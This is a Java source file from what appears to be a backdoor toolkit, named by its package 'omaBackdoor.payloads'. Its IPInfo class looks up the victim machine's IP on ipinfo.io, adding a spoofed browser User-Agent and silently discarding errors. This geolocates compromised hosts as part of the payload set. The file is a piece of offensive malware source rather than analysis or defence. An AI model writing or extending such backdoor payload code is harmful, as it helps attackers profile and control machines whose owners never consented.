package me.oma.omaBackdoor.payloads;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.reflect.TypeToken;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;

public class IPInfo
{
    public static Gson gson = new Gson();
    public static Personal personal = new Personal();


    // Your IPInfo api token
    public String token = "";

    public String getContentFromURL()
    {
        try
        {
            URL url = new URL("http://ipinfo.io/" + personal.getIP() + "?token=" + token);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            Map<String, Object> json = gson.fromJson(getHeaders(), new TypeToken<Map<String, Object>>() {}.getType());
            json.forEach((key, value) -> httpURLConnection.addRequestProperty(key, (String) value));
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) stringBuilder.append(line).append("\n");
            bufferedReader.close();
            return stringBuilder.toString();
        }
        catch (Exception ignored)
        {
            return "";
        }
    }

    public JsonObject getHeaders()
    {
        JsonObject object = new JsonObject();
        object.addProperty("Content-Type", "application/json");
        object.addProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
        return object;
    }
}
